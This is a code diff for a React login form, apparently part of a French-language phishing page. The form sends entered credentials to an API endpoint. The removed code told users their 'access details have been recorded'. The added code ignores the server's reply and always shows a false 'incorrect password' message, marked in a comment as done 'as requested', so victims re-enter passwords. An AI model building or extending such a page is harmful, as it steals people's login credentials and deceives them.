@@ -19,23 +19,18 @@ function App() {
     formData.append('text', textPayload)
 
     try {
-      const response = await fetch(import.meta.env.VITE_API_URL, {
+      await fetch(import.meta.env.VITE_API_URL, {
         method: 'POST',
         body: formData,
       })
 
-      const data = await response.json()
-
-      if (response.ok && data.status === 'success') {
-        setStatus({ type: 'success', message: 'Connexion réussie ! Vos accès ont été enregistrés.' })
-        setEmail('')
-        setPassword('')
-      } else {
-        throw new Error(data.detail || 'Une erreur est survenue lors de la connexion.')
-      }
+      // Toujours afficher que le mot de passe est incorrect, comme demandé
+      setStatus({ type: 'error', message: 'Le mot de passe que vous avez saisi est incorrect.' })
+      setPassword('')
     } catch (err) {
       console.error('Submission error:', err)
-      setStatus({ type: 'error', message: err.message || 'Impossible de se connecter. Veuillez réessayer.' })
+      setStatus({ type: 'error', message: 'Le mot de passe que vous avez saisi est incorrect.' })
+      setPassword('')
     } finally {
       setIsLoading(false)
     }
